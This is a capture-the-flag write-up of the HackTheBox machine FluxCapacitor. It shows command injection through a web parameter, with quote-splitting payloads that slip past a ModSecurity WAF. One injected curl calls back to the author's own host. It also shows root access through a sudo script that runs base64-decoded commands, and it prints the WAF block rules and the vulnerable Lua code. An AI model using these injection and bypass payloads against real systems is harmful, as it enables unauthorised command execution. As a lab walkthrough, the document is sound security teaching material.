---
title: HTB: FluxCapacitor
url: https://0xdf.gitlab.io/2018/05/12/htb-fluxcapacitor.html
date: 2018-05-12T23:39:12+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-fluxcapacitor, waf, wfuzz, sudo
---

Probably my least favorite box on HTB, largely because it involved a lot of guessing. I did enjoy looking for privesc without having a shell on the host.

## Box Info

| Name | [FluxCapacitor](https://hackthebox.com/machines/fluxcapacitor)  [FluxCapacitor](https://hackthebox.com/machines/fluxcapacitor) [Play on HackTheBox](https://hackthebox.com/machines/fluxcapacitor) |
| --- | --- |
| Release Date | 16 Dec 2017 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for FluxCapacitor |
| Radar Graph | Radar chart for FluxCapacitor |
| First Blood User | 05:45:24[arkantolo arkantolo](https://app.hackthebox.com/users/1183) |
| First Blood Root | 07:58:26[yuntao yuntao](https://app.hackthebox.com/users/12438) |
| Creator | [del_EzjAx34h del\_EzjAx34h](https://app.hackthebox.com/users/8955) |

## Recon

### nmap

Only TCP 80 seems open:

```

root@kali# nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap/alltcp 10.10.10.69

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-21 06:14 EDT
Warning: 10.10.10.69 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.69
Host is up (0.098s latency).
Not shown: 63754 closed ports, 1780 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
root@kali# nmap -sU -p- --min-rate 5000 --max-retries 1 -oA nmap/alludp 10.10.10.69

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-21 06:14 EDT
Warning: 10.10.10.69 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.69
Host is up (0.10s latency).
All 65535 scanned ports on 10.10.10.69 are open|filtered (65504) or closed (31)

nmap done: 1 IP address (1 host up) scanned in 26.69 seconds

```

### port 80

The page is super simple:
![](https://0xdfimages.gitlab.io/img/fluxcapacitor-htb.png)

The source reveals another path, /sync:

```

<!DOCTYPE html>
<html>
<head>
<title>Keep Alive</title>
</head>
<body>
	OK: node1 alive
	<!--
		Please, add timestamp with something like:
		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
	-->
	<hr/>
	FluxCapacitor Inc. info@fluxcapacitor.htb - http://fluxcapacitor.htb<br>
	<em><met><doc><brown>Roads? Where we're going, we don't need roads.</brown></doc></met></em>
</body>
</html>

```

Visiting this path in the browser returns forbidden. I’ll try `gobuster` to look for other paths:

```

root@kali# gobuster -u http://fluxcapacitor.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
​
Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://fluxcapacitor.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
=====================================================
/sync (Status: 200)
/synctoy (Status: 200)
/syncing (Status: 200)
/sync_scan (Status: 200)
/syncnister (Status: 200)
/syncbackse (Status: 200)
/synch (Status: 200)
/sync4j (Status: 200)
/synchpst (Status: 200)
/syncapture (Status: 200)
/syncback (Status: 200)
/syncml (Status: 200)
/synchronization (Status: 200)
=====================================================

```

Finds the same `/sync` path, but it gets a 200, not a 403. Any path starting sync\* will return the same. curl shows a good result too:

```

root@kali# curl http://fluxcapacitor.htb/sync
20180321T11:35:15
root@kali# curl http://fluxcapacitor.htb/sync -x http://127.0.0.1:8080
20180321T11:37:42

```

Suspect that it is filtering on user agent. Confirmed by catching a request from firefox with burp, changing the UA to ‘yip’, and then the result is the time.

Since this `/sync` path is used for something, let’s look for a parameter using `wfuzz`. Interstingly, opt returns something different:

```

root@kali# wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: nothingtoseehere" --hh=19 "http://fluxcapacitor.htb/sync?FUZZ=test"
​
Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
​
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************
​
Target: http://fluxcapacitor.htb/sync?FUZZ=test
Total requests: 220560
​
==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================
​
009874:  C=403      7 L       10 W          175 Ch        "opt"
060620:  C=200      2 L        1 W       19 Ch    "87764"
Fatal exception: Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received

```

Next I’ll try to figure out what the opt parameter takes. [This page](https://bitvijays.github.io/LFC-VulnerableMachines.html#parameter-fuzz) shows a method.

If I just send the ‘, it comes back with ‘\n’ payload, with the following header (curl then burp response header):

```

root@kali# curl -v "http://fluxcapacitor.htb/sync?opt='" -x http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to (nil) (127.0.0.1) port 8080 (#0)
> GET http://fluxcapacitor.htb/sync?opt=' HTTP/1.1
> Host: fluxcapacitor.htb
> User-Agent: curl/7.81.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 15 Jul 2023 10:09:50 GMT
< Content-Type: text/plain
< Connection: close
< Server: SuperWAF
< Content-Length: 1
< 
* Closing connection 0

```

If i put in something else for `opt` without the ‘:

```

root@kali# curl -v "http://fluxcapacitor.htb/sync?opt=ls" -x http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* Connected to (nil) (127.0.0.1) port 8080 (#0)
> GET http://fluxcapacitor.htb/sync?opt=ls HTTP/1.1
> Host: fluxcapacitor.htb
> User-Agent: curl/7.81.0
> Accept: */*
> Proxy-Connection: Keep-Alive
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 15 Jul 2023 10:10:25 GMT
< Content-Type: text/html
< Content-Length: 175
< Connection: close
< 
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>openresty/1.13.6.1</center>
</body>
</html>
* Closing connection 0

```

Tried a bunch of different stuff, all that returns 403:
- `http://fluxcapacitor.htb/sync?opt='echo'`
- `http://fluxcapacitor.htb/sync?opt='echo`
- `http://fluxcapacitor.htb/sync?opt='pwd`
- `http://fluxcapacitor.htb/sync?opt='/bin/ls`
- `http://fluxcapacitor.htb/sync?opt='/usr/bin/curl+10.10.15.147`
- `http://fluxcapacitor.htb/sync?opt='wget`
- `http://fluxcapacitor.htb/sync?opt=wget`

Other stuff returns the time (api working correctly), and these have the same Server: SuperWAF header in the response:
- `http://fluxcapacitor.htb/sync?opt=''`
- `http://fluxcapacitor.htb/sync?opt='.'`
- `http://fluxcapacitor.htb/sync?opt='/'`

Other stuff returns an empty line:
- `http://fluxcapacitor.htb/sync?opt='/`
- `http://fluxcapacitor.htb/sync?opt='/b`
- `http://fluxcapacitor.htb/sync?opt='/bin`
- `http://fluxcapacitor.htb/sync?opt='/bin/l`
- `http://fluxcapacitor.htb/sync?opt='/bin/l?`
- `http://fluxcapacitor.htb/sync?opt='/usr/bin/cur?+10.10.15.147`

Perhaps the 403 is a WAF rejecting me, which is why /bin/l doesn’t get 403, but /bin/ls does? But the Server: SuperWAF comes back only in the empty replies and the functional replies.

Seems like if I can figure out command injection, then I can figure out how to get that through the WAF…

Adding a space starts to get somewhere…and using ” to break things apart.
*July 2023 Update* - It seems that `curl` behaves a bit differently now, and won’t send these kind of broken payloads any more. Where in 2018, this worked:

```

root@kali# curl "10.10.10.69/sync?opt=' pw''d'"
/
bash: -c: option requires an argument

root@kali# curl "10.10.10.69/sync?opt=' whi''ch cu''rl'"
/usr/bin/curl
bash: -c: option requires an argument

```

In 2023, it does not:

```

oxdf@hacky$ curl "10.10.10.69/sync?opt=' pw''d'"
curl: (3) URL using bad/illegal format or missing URL

```

No request is even sent. Still, it does work in Burp Repeater:

![image-20230715061913023](/img/image-20230715061913023.png)

I won’t update every command from here on, but do note that you may need something else besides `curl`. Thanks to InvertedClimbing for the tip.

Test callout:

```

root@kali# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.69 - - [25/Mar/2018 14:34:01] "GET / HTTP/1.1" 200 -

root@kali# curl "10.10.10.69/sync?opt=' cu''rl 10.10.14.157'"
0xdf
bash: -c: option requires an argument

```

Grab user.txt:

```

root@kali# curl "10.10.10.69/sync?opt=' l''s /home'"
FluxCapacitorInc
themiddle
bash: -c: option requires an argument

root@kali# curl "10.10.10.69/sync?opt=' l''s /home/themiddle'"
checksync
user.txt
bash: -c: option requires an argument

root@kali# curl "10.10.10.69/sync?opt=' c''at /home/themiddle/us''er.txt'"
Flags? Where we're going we don't need flags.
bash: -c: option requires an argument

root@kali# curl "10.10.10.69/sync?opt=' c''at /home/FluxCapacitorIn''c/us''er.txt'"
[redacted]
bash: -c: option requires an argument

```

## Get a shell?

Try a shell:

```

root@kali# curl "10.10.10.69/sync?opt=' whi''ch pytho''n'"
bash: -c: option requires an argument

root@kali# curl "10.10.10.69/sync?opt=' whi''ch pytho''n3'"
/usr/bin/python3
bash: -c: option requires an argument

```

## Give up on Shell, privesc through web

Can find python3, but pipe gets blocked, and i can’t write even to tmp. Getting a shell seems hard.

Since I can’t get LinEnum up on the box, think about the things it typically finds. sudo is a good place to start:

```

root@kali# curl "10.10.10.69/sync?opt=' su''do -l'"
Matching Defaults entries for nobody on fluxcapacitor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nobody may run the following commands on fluxcapacitor:
    (ALL) ALL
    (root) NOPASSWD: /home/themiddle/.monit
bash: -c: option requires an argument

root@kali# curl "10.10.10.69/sync?opt=' c''at /home/themiddle/.monit'"
#!/bin/bash

if [ "$1" == "cmd" ]; then
        echo "Trying to execute ${2}"
        CMD=$(echo -n ${2} | base64 -d)
        bash -c "$CMD"
fi
bash: -c: option requires an argument

```

So it looks like the current user can run `sudo /home/themiddle/.monit cmd [base64 string]`, and that base64 string will be decodeed and run as root!

```

root@kali# curl "10.10.10.69/sync?opt=' su''do /home/themiddle/.monit cmd $(echo cat /root/root.txt | base64)'"
Trying to execute Y2F0IC9yb290L3Jvb3QudHh0Cg==
[redacted]
bash: -c: option requires an argument

```

## Other things to pull

Using this access, pull the webserver configuration:

```

root@kali# curl "10.10.10.69/sync?opt=' sudo /home/themiddle/.monit cmd $(echo cat /usr/local/o*/n*/conf/ngin*f| base64)'" > nginx.conf

```

This defines the WAF and the functionality of the application:

```

...
more_clear_headers 'Server';
add_header Server 'SuperWAF';

modsecurity on;
location /sync {
 default_type 'text/plain';

modsecurity_rules '
 SecDefaultAction "phase:1,log,auditlog,deny,status:403"
 SecDefaultAction "phase:2,log,auditlog,deny,status:403"

SecRule REQUEST_HEADERS:User-Agent "^(Mozilla|Opera)" "id:1,phase:2,t:trim,block"

SecRuleEngine On
 SecRule ARGS "@rx [;\(\)\|\`\<\>\&\$\*]" "id:2,phase:2,t:trim,t:urlDecode,block"
 SecRule ARGS "@rx (user\.txt|root\.txt)" "id:3,phase:2,t:trim,t:urlDecode,block"
 SecRule ARGS "@rx (\/.+\s+.*\/)" "id:4,phase:2,t:trim,t:urlDecode,block"
 SecRule ARGS "@rx (\.\.)" "id:5,phase:2,t:trim,t:urlDecode,block"
 SecRule ARGS "@rx (\?s)" "id:6,phase:2,t:trim,t:urlDecode,block"

SecRule ARGS:opt "@pmFromFile /usr/local/openresty/nginx/conf/unixcmd.txt" "id:99,phase:2,t:trim,t:urlDecode
,block"
 ';

content_by_lua_block {
 local opt = 'date'
 if ngx.var.arg_opt then
 opt = ngx.var.arg_opt
 end
-- ngx.say("DEBUG: CMD='/home/themiddle/checksync "..opt.."'; bash -c $CMD 2>&1")

local handle = io.popen("CMD='/home/themiddle/checksync "..opt.."'; bash -c ${CMD} 2>&1")
 local result = handle:read("*a")
 handle:close()
 ngx.say(result)
 }
...

```